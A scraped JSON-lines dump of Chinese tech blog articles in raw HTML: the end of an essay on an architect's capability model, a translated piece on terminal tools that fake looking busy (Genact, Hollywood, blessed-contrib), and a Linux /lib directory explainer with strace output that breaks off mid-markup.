id=\"-\">调试能力</h2>\n<p>程序代码是系统的静态形式，调试的目的是通过查看程序的运行时状态来验证和优化系统。本质上讲，工程师们通过不断调试可以持续强化其通过静态代码去预测运行状态的能力。所以调试能力也是工程师编程能力提升的关键手段。很早之前有个传说：“调试能力有多强，编程能力就有多强。”不过现在很多编辑器的功能很强大，调试能力的门槛已经大大降低。</p>\n<p>调试能力是项目能否按时、高质量提交的关键。即使一个稍具复杂度的项目，大部分工程师也无法一次性准确无误的完成。大项目都是通过不断地调试进行优化和纠错的。所以调试能力是不可或缺的能力。</p>\n<p>多写程序，解决Bug，多请教高手是提升调试能力的重要手段。</p>\n<h2 id=\"-\">编译部署能力</h2>\n<p>编译并在线上部署运行程序是系统上线的最后一个环节。随着SOA架构的普及以及业务复杂度的增加，大部分系统只是一个完整业务的一个环节，因此，本地编译和运行并不能完全模拟系统在线运行。为了快速验证所编写程序的正确性，编译并在线上部署就成了必要环节。所以编译部署能力是一个必备技能。</p>\n<p>让盘根错节的众多子系统运行起来是个不小的挑战。得益于SOA架构的普及以及大量编译、部署工具的发展，编译部署的门槛已经大大降低。基于应用层进行开发的公司，已经很少有“编译工程师”的角色了。但是对于初级工程师而言，编译部署仍然不是一个轻松的事情。</p>\n<h2 id=\"-\">性能优化能力</h2>\n<p>衡量一个系统成功的一个重要指标是使用量。随着使用量的增加和业务复杂度的增加，大部分系统最终都会碰到性能问题。 性能优化能力是一个综合能力。因为：</p>\n<ul>\n<li>影响系统性能的因素众多，包括：数据结构、操作系统、虚拟机、CPU、存储、网络等。为了对系统性能进行调优，架构师需要掌握所有相关的技术。</li>\n<li>精通性能优化意味着深刻理解可用性、可靠性、一致性、可维护性、可扩展性等的本质。</li>\n<li>性能优化与业务强耦合，最终所采取的手段是往往折衷的结果。所以，性能优化要深谙妥协的艺术。</li>\n</ul>\n<p>可以说，性能优化能力是工程师们成长过程中各种技能开始融会贯通的一个标志。这方面可以参考之前的博客文章“常见性能优化策略的总结”。市场上还有很多与性能优化相关的书籍，大家可以参考。多多阅读开源框架中关于性能优化方面的文档和代码也不失为好的提升手段。动手解决线上性能问题也是提升性能优化能力的关键。如果有机会，跟着高手学习，分析性能优化解决方案案例（我们技术博客之前也发表了很多这方面的文章），也是快速提升性能优化能力的手段。</p>\n<h2 id=\"-\">在线运维能力</h2>\n<p>如果说性能优化能力体现的是架构师的静态思考能力，在线运维能力考验的就是动态反应能力。残酷的现实是，无论程序多么完美，Bug永远存在。与此同时，职位越高、责任越大，很多架构师需要负责非常重要的在线系统。对于线上故障，如果不能提前预防以及快速解决，损失可能不堪设想，所以在线运维能力是优秀架构师的必备技能。</p>\n<p>为了对线上故障进行快速处理，标准化的监控、上报、升级，以及基本应对机制当然很重要。通过所观察到的现象，快速定位、缓解以及解决相关症状也相当关键。这要求架构师对故障系统的业务、技术具备通盘解读能力。解决线上故障的架构师就好比一个在参加比赛F1的车手。赛车手必须要了解自身、赛车、对手、同伴、天气、场地等所有因素，快速决策，不断调整。架构师必须要了解所有技术细节、业务细节、处理规范、同伴等众多因素，快速决断，迅速调整。</p>\n<p>在线运维本质上是一个强化学习的过程。很多能力都可以通过看书、查资料来完成，但在线运维能力往往需要大量的实践来提升。</p>\n<h2 id=\"-\">业务架构能力</h2>\n<p>工程师抱怨产品经理的故事屡见不鲜，抱怨最多的主要原因来自于需求的频繁变更。需求变更主要有两个来源：第一个原因是市场改变或战略调整，第二个原因是伪需求。对于第一个原因，无论是工程师还是产品经理，都只能无奈的接受。优秀的架构师应该具备减少第二种原因所导致的需求变更的概率。</p>\n<p>伪需求的产生有两个原因：</p>\n<p>第一个原因是需求传递变形。从信息论的角度来讲，任何沟通都是一个编码和解码的过程。典型的需求从需求方到产品经理，最终到开发工程师，最少需要经历三次编码和解码过程。而信息的每一次传递都存在一些损失并带来一些噪音，这导致有些时候开发出来的产品完全对不上需求。此外，需求方和产品经理在需求可行性、系统可靠性，开发成本控制方面的把控比较弱，也会导致需求变形。</p>\n<p>第二个原因就是需求方完全没有想好自己的需求。</p>\n<p>优秀的架构师应该具备辨别真伪需求的能力。应该花时间去了解客户的真实业务场景，具备较强的业务抽象能力，洞悉客户的真实需求。系统的真正实施方是工程师，在明确客户真实需求后，高明的架构师应该具备准确判断项目对可行性、可靠性、可用性等方面的要求，并能具备成本意识。最后，由于需求与在线系统的紧耦合关系，掌握在线系统的各种细节也是成功的业务架构的关键。随着级别的提升，工程师所面对的需求会越来越抽象。承接抽象需求，提供抽象架构是架构师走向卓越的必经之途。</p>\n<p>市场上有一些关于如何成为架构师的书，大家可以参考。但是架构能力的提升，实践可能是更重要的方式。业务架构师应该关注客户的痛点而不是PRD文档，应该深入关注真实业务。掌握现存系统的大量技术和业务细节也是业务架构师的必备知识。</p>\n<h2 id=\"-\">项目管理能力</h2>\n<p>作为工业时代的产物，分工合作融入在互联网项目基因里面。架构师也需要负责几个重大项目才能给自己正名。以架构师角色去管理项目，业务架构能力当然是必备技能。此外，人员管理和成本控制意识也非常重要。</p>\n<p>项目管理还意味着要有一个大心脏。重大项目涉及技术攻关、人员变动、需求更改等众多可变因素。面临各种变化，还要在确保目标顺利达成，需要较强的抗压能力。</p>\n<p>人员管理需要注意的方面包括：知人善用，优化关系，简化沟通，坚持真理。</p>\n<ul>\n<li>知人善用意味着架构师需要了解每个参与者的硬技能和软素质。同时，关注团队成员在项目过程中的表现，按能分配。</li>\n<li>优化关系意味着管理团队的情绪，毕竟项目的核心是团队，有士气的团队才能高效达成目标。</li>\n<li>简化沟通意味着快速决策，该妥协的时候妥协，权责分明。</li>\n<li>坚持真理意味着顶住压力，在原则性问题上绝不退步。</li>\n</ul>\n<p>成本控制意味着对项目进行精细化管理，需要遵循如下几个原则：</p>\n<ul>\n<li>以终为始、确定里程碑。为了达成目标，所有的计划必须以终为始来制定。将大项目分解成几个小阶段，控制每个阶段的里程碑可以大大降低项目失败的风险。</li>\n<li>把控关键路径和关键项目。按照关键路径管理理论（CPM）的要求，架构师需要确定每个子项目的关键路径，确定其最早和最晚启动时间。同时，架构师需要关注那些可能会导致项目整体延期的关键节点，并集中力量攻破。</li>\n<li>掌控团队成员的张弛度。大项目持续时间会比较长，也包含不同工种。项目实施是一个不断变化的动态过程，在这个过程中不是整个周期都很紧张，不是所有的工种都一样忙。优秀的架构师必须要具备精细阅读整体项目以及快速反应和实时调整的能力。这不仅仅可以大大降低项目成本，还可以提高产出质量和团队满意度。总体来说，“前紧后松”是项目管理的一个重要原则。</li>\n</ul>\n<p>项目管理方面的书籍很多。但是，提高业务架构能力同样重要。积极参与大项目并观察别人管理项目的方式也是非常重要的提升手段。</p>\n<h2 id=\"-\">团队管理能力</h2>\n<p>不想做CTO的工程师不是一个好的架构师。走向技术管理应该是工程师的一个主流职业规划。团队管理的一个核心能力就是规划能力，这包括项目规划和人员规划。良好的规划需要遵循如下原则：</p>\n<ul>\n<li>规划是利益的博弈。良好的规划上面对得起老板，中间对得起自己，下面对得起团队。在三者利益者寻找平衡点，实现多方共赢考验着管理者的智慧和精细拿捏的能力。</li>\n<li>任何规划都比没有规划好。没有规划的团队就是没头的苍蝇，不符合所有人的利益。</li>\n<li>规划不是本本主义。市场在变，团队在变，规划也不应该一成不变。</li>\n<li>客户至上的是项目规划的出发点。</li>\n<li>就人员规划而言，规划需要考量团队成员的能力、绩效、成长等多方面的因素。</li>\n</ul>\n<p>市场上有很多规划管理方面的书籍，值得阅读。最优化理论虽然是技术书籍，但它是规划的理论基础，所以不妨多看看翻阅一下。从自我规划开始，多多学习别人的规划也是规划能力提升的重要手段。</p>\n<h1 id=\"-\">总结</h1>\n<p>因为受邀去做一个关于“一边工作，一边学习”的分享，作者花了一段时间去思考和汇总学习方法论，接着每天不断地采集谣言并尝试解惑，再根据个人经验绘制出优秀架构师的能力模型，最后汇集成文。</p>\n<p>文章系统性地阐述了学习原则、分析了常见困惑，并制定明确学习目标，期望对工程师们的工作学习有所帮助。需要申明的是，文章内容挂一漏万，所谓的架构师能力模型也是作者的个人观点。欢迎大家在评论中分享自己在学习成长方面的心得。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113896\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113896votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113896\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "All,IT技术,互联网", "url": "http://blog.jobbole.com/113896/", "url_obj_id": "8e61db3f3bf1d94bc3a13d55899bc864"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/04/56513a8ab958df253f196a60a8424763.jpg"], "title": "假装很忙的三个命令行工具", "create_date": "2018/04/30 ·", "praise_num": 1, "fav_num": 4, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://opensource.com/article/18/2/command-line-tools-productivity\">Jason Baker</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9591-1.html\">Linux中国/wyxplus</a>   </div><blockquote><p>有时候你很忙。而有时候你只是需要看起来很忙，就像电影中的黑客一样。有一些开源工具就是干这个的。</p></blockquote>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/04/56513a8ab958df253f196a60a8424763.jpg\"></p>\n<p>如果在你在消磨时光时看过谍战片、动作片或犯罪片，那么你就会清晰地在脑海中勾勒出黑客的电脑屏幕的样子。就像是在《黑客帝国》电影中，<a href=\"http://tvtropes.org/pmwiki/pmwiki.php/Main/MatrixRainingCode\">代码雨</a> 一样的十六进制数字流，又或是一排排快速移动的代码。</p>\n<p>也许电影中出现一幅世界地图，其中布满了闪烁的光点和一些快速更新的图表。不可或缺的，也可能有 3D 旋转的几何形状。甚至，这一切都会显示在一些完全不符合人类习惯的数量荒谬的显示屏上。 在《剑鱼行动》电影中黑客就使用了七个显示屏。</p>\n<p>当然，我们这些从事计算机行业的人一下子就明白这完全是胡说八道。虽然在我们中，许多人都有双显示器（或更多），但一个闪烁的数据仪表盘、刷新的数据通常和专注工作是相互矛盾的。编写代码、项目管理和系统管理与日常工作不同。我们遇到的大多数情况，为了解决问题，都需要大量的思考，与客户沟通所得到一些研究和组织的资料，然后才是少许的 <a href=\"http://tvtropes.org/pmwiki/pmwiki.php/Main/RapidFireTyping\">敲代码</a>。</p>\n<p>然而，这与我们想追求电影中的效果并不矛盾，也许，我们只是想要看起来“忙于工作”而已。</p>\n<p><strong>注：当然，我仅仅是在此胡诌。</strong>如果您公司实际上是根据您繁忙程度来评估您的工作时，无论您是蓝领还是白领，都需要亟待解决这样的工作文化。假装工作很忙是一种有毒的文化，对公司和员工都有害无益。</p>\n<p>这就是说，让我们找些乐子，用一些老式的、毫无意义的数据和代码片段填充我们的屏幕。（当然，数据或许有意义，但不是在这种没有上下文的环境中。）当然有一些用于此用途的有趣的图形界面程序，如 <a href=\"https://hackertyper.net/\">hackertyper.net</a> 或是 <a href=\"http://geektyper.com\">GEEKtyper.com</a> 网站（LCTT 译注：是在线假装黑客操作的网站），为什么不使用标准的 Linux 终端程序呢？对于更老派的外观，可以考虑使用 <a href=\"https://github.com/Swordfish90/cool-retro-term\">酷炫复古终端</a>，这听起来确实如此：一个酷炫的复古终端程序。我将在下面的屏幕截图中使用酷炫复古终端，因为它看起来的确很酷。</p>\n<h3 id=\"toc_1\">Genact</h3>\n<p>我们来看下第一个工具——Genact。Genact 的原理很简单，就是慢慢地无尽循环播放您选择的一个序列，让您的代码在您外出休息时“编译”。由您来决定播放顺序，但是其中默认包含数字货币挖矿模拟器、Composer PHP 依赖关系管理工具、内核编译器、下载器、内存转储等工具。其中我最喜欢的是其中类似《模拟城市》加载显示。所以只要没有人仔细检查，你可以花一整个下午等待您的电脑完成进度条。</p>\n<p>Genact <a href=\"https://github.com/svenstaro/genact/releases\">发布了</a> 支持 Linux、OS X 和 Windows 的版本。并且其 Rust <a href=\"https://github.com/svenstaro/genact\">源代码</a> 在 GitHub 上开源（遵循 <a href=\"https://github.com/svenstaro/genact/blob/master/LICENSE\">MIT 许可证</a>）。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/04/3f7854f8c5739aaacedb4240b3bf9874.gif\" alt=\"\"></p>\n<h3 id=\"toc_2\">Hollywood</h3>\n<p>Hollywood 采取更直接的方法。它本质上是在终端中创建一个随机的数量和配置的分屏，并启动那些看起来很繁忙的应用程序，如 htop、目录树、源代码文件等，并每隔几秒将其切换。它被组织成一个 shell 脚本，所以可以非常容易地根据需求进行修改。</p>\n<p>Hollywood的 <a href=\"https://github.com/dustinkirkland/hollywood\">源代码</a> 在 GitHub 上开源（遵循 <a href=\"http://www.apache.org/licenses/LICENSE-2.0\">Apache 2.0 许可证</a>）。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/04/42e952746b073eff9177ca282862b43d.gif\" alt=\"\"></p>\n<h3 id=\"toc_3\">Blessed-contrib</h3>\n<p>Blessed-contrib 是我个人最喜欢的应用，实际上并不是为了这种表演而专门设计的应用。相反地，它是一个基于 Node.js 的终端仪表盘的构建库的演示文件。与其他两个不同，实际上我已经在工作中使用 Blessed-contrib 的库，而不是用于假装忙于工作。因为它是一个相当有用的库，并且可以使用一组在命令行显示信息的小部件。与此同时填充虚拟数据也很容易，所以可以很容易实现你在计算机上模拟《战争游戏》的想法。</p>\n<p>Blessed-contrib 的<a href=\"https://github.com/yaronn/blessed-contrib\">源代码</a>在 GitHub 上（遵循 <a href=\"http://opensource.org/licenses/MIT\">MIT 许可证</a>）。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/04/42155a883312531aeec5fe4fe701c1de.gif\" alt=\"\"></p>\n<p>当然，尽管这些工具很容易使用，但也有很多其他的方式使你的屏幕丰富。在你看到电影中最常用的工具之一就是Nmap，这是一个开源的网络安全扫描工具。实际上，它被广泛用作展示好莱坞电影中，黑客电脑屏幕上的工具。因此 Nmap 的开发者创建了一个 <a href=\"https://nmap.org/movies/\">页面</a>，列出了它出现在其中的一些电影，从《黑客帝国 2：重装上阵》到《谍影重重3》、《龙纹身的女孩》，甚至《虎胆龙威 4》。</p>\n<p>当然，您可以创建自己的组合，使用终端多路复用器（如 <code>screen</code> 或 <code>tmux</code>）启动您希望使用的任何数据切分程序。</p>\n<p>那么，您是如何使用您的屏幕的呢？</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113936\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113936votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113936\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 4 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,Linux", "url": "http://blog.jobbole.com/113936/", "url_obj_id": "6dc0686e6040c195843be3d562eb4e11"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "title": "Linux 目录结构：/lib 分析", "create_date": "2018/04/28 ·", "praise_num": 1, "fav_num": 5, "comment_num": 1, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.linuxnix.com/linux-directory-structure-lib-explained/\">Surendra Anne</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9580-1.html\">Linux中国/ChenYi</a>   </div><p>我们在之前的文章中已经分析了其他重要系统目录，比如 <code>/bin</code>、<code>/boot</code>、<code>/dev</code>、 <code>/etc</code> 等。可以根据自己的兴趣进入下列链接了解更多信息。本文中，让我们来看看 <code>/lib</code> 目录都有些什么。</p>\n<ul>\n<li><a href=\"https://www.linuxnix.com/linux-directory-structure-explained-bin-folder/\">目录结构分析：/bin 文件夹</a></li>\n<li><a href=\"https://www.linuxnix.com/linux-directory-structure-explained-boot-folder/\">目录结构分析：/boot 文件夹</a></li>\n<li><a href=\"https://www.linuxnix.com/linux-directory-structure-explained-dev-folder/\">目录结构分析：/dev 文件夹</a></li>\n<li><a href=\"https://www.linuxnix.com/linux-directory-structure-explainedetc-folder/\">目录结构分析：/etc 文件夹</a></li>\n<li><a href=\"https://www.linuxnix.com/lostfound-directory-linuxunix/\">目录结构分析：/lost+found 文件夹</a></li>\n<li><a href=\"https://www.linuxnix.com/linux-directory-structure-home-root-folders/\">目录结构分析：/home 文件夹</a></li>\n</ul>\n<h3 id=\"toc_1\">Linux 中，/lib 文件夹是什么？</h3>\n<p><code>/lib</code> 文件夹是 <strong>库文件目录</strong> ，包含了所有对系统有用的库文件。简单来说，它是应用程序、命令或进程正确执行所需要的文件。在 <code>/bin</code> 或 <code>/sbin</code> 目录中的命令的动态库文件正是在此目录中。内核模块同样也在这里。</p>\n<p>以 <code>pwd</code> 命令执行为例。执行它需要调用一些库文件。让我们来探索一下 <code>pwd</code> 命令执行时都发生了什么。我们需要使用 <a href=\"https://www.linuxnix.com/10-strace-command-examples-linuxunix/\">strace 命令</a> 找出调用的库文件。</p>\n<p>示例：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a7de0cc11c515227719\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nroot@linuxnix:~# strace -e open pwd\r\nopen(\"/etc/ld.so.cache\", O_RDONLY|O_CLOEXEC) = 3\r\nopen(\"/lib/x86_64-linux-gnu/libc.so.6\", O_RDONLY|O_CLOEXEC) = 3\r\nopen(\"/usr/lib/locale/locale-archive\", O_RDONLY|O_CLOEXEC) = 3\r\n/root\r\n+++ exited with 0 +++\r\nroot@linuxnix:~# \r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a7de0cc11c515227719-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7de0cc11c515227719-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a7de0cc11c515227719-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7de0cc11c515227719-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a7de0cc11c515227719-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7de0cc11c515227719-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4a7de0cc11c515227719-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7de0cc11c515227719-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a7de0cc11c515227719-1\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">linuxnix</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-p\"># strace -e open pwd</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7de0cc11c515227719-2\"><span class=\"crayon-e\">open</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"/etc/ld.so.cache\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">O_RDONLY</span><span class=\"crayon-o\">|</span><span class=\"crayon-v\">O_CLOEXEC</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span></div><div class=\"crayon-line\" id=\"crayon-5b4a7de0cc11c515227719-3\"><span class=\"crayon-e\">open</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"/lib/x86_64-linux-gnu/libc.so.6\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">O_RDONLY</span><span class=\"crayon-o\">|</span><span class=\"crayon-v\">O_CLOEXEC</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7de0cc11c515227719-4\"><span class=\"crayon-e\">open</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"/usr/lib/locale/locale-archive\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">O_RDONLY</span><span class=\"crayon-o\">|</span><span class=\"crayon-v\">O_CLOEXEC</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span></div><div class=\"crayon-line\" id=\"crayon-5b4a7de0cc11c515227719-5\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">root</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7de0cc11c515227719-6\"><span class=\"crayon-o\">++</span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">exited </span><span class=\"crayon-i\">with</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">++</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line\" id=\"crayon-5b4a7de0cc11c515227719-7\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">linuxnix</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-p\"># </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a7de0cc11c515227719-8\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0015 seconds] -->\r\n<p>如果你注意到的话，会发现我们使用的 <code>pwd</code> 命令的执行需要调用两个库文件。</p>\n<h3 id=\"toc_2\">Linux 中 /lib 文件夹内部信息</h3>\n<p>正如之前所说，这个文件夹包含了目标文件和一些库文件，如果能了解这个文件夹的一些重要子文件，想必是极好的。下面列举的内容是基于我自己的系统，对于你的来说，可能会有所不同。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a7de0cc125833265715\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nroot@linuxnix:/lib# find . -maxdepth 1  -type d\r\n./firmware\r\n./modprobe.d\r\n./xtables\r\n./apparmor\r\n./terminfo\r\n./plymouth\r\n./init\r\n./lsb\r\n./recovery-mode\r\n./resolvconf\r\n./crda\r\n./modules\r\n./hdparm\r\n./udev\r\n./ufw\r\n./ifupdown\r\n./systemd\r\n./modules-load.d\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a7de0cc125833265715-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7de0cc125833265715-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a7de0cc125833265715-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7de0cc125833265715-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a7de0cc125833265715-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7de0cc125833265715-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4a7de0cc125833265715-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7de0cc125833265715-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4a7de0cc125833265715-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a7de0cc125833265715-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4a7de0cc125833265715-11\">11</div><div class=\"crayon-num 